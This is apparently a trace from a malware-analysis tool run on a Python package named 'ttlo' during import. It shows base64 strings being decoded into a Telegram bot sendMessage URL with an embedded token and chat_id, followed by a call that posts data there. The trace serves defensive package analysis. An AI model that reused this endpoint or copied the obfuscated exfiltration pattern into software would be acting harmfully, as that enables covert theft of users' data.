[artifact_eval/samples/packages/026_ttlo-1.0.1/_pyfex_import_ttlo.py:3] [print]('[pyfex-entry] import ttlo')
[artifact_eval/samples/packages/026_ttlo-1.0.1/_pyfex_import_ttlo.py:4] [import_module]('ttlo')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/__init__.py:3] [ttlo]()
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/ttlo.py:7] [b]('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYyOTAyNjE1Njc6QUFGMVcwalJ0a0RubkdCbFlBbWJDSXpVdTJxRGRUY19ibTQvc2VuZE1lc3NhZ2U=')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/b.py:5] [b64decode]('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYyOTAyNjE1Njc6QUFGMVcwalJ0a0RubkdCbFlBbWJDSXpVdTJxRGRUY19ibTQvc2VuZE1lc3NhZ2U=')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/b.py:5] [method_descriptor](b'https://api.telegram.org/bot6290261567:AAF1W0jRtkDnnGBlYAmbCIzUu2qDdTc_bm4/sendMessage')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/ttlo.py:7] [b]('Y2hhdF9pZA==')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/b.py:5] [b64decode]('Y2hhdF9pZA==')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/b.py:5] [method_descriptor](b'chat_id')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/ttlo.py:7] [b]('NTg1NDk1NDM4OA==')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/b.py:5] [b64decode]('NTg1NDk1NDM4OA==')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/b.py:5] [method_descriptor](b'5854954388')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/ttlo.py:7] [b]('dGV4dA==')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/b.py:5] [b64decode]('dGV4dA==')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/b.py:5] [method_descriptor](b'text')
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/ttlo.py:7] [DummyObject]()
[artifact_eval/samples/packages/026_ttlo-1.0.1/ttlo/ttlo.py:7] [DummyObject]('https://api.telegram.org/bot6290261567:AAF1W0jRtkDnnGBlYAmbCIzUu2qDdTc_bm4/sendMessage', data={'chat_id': '5854954388', 'text': <DummyObject Unknown error@ttlo.py:7>})
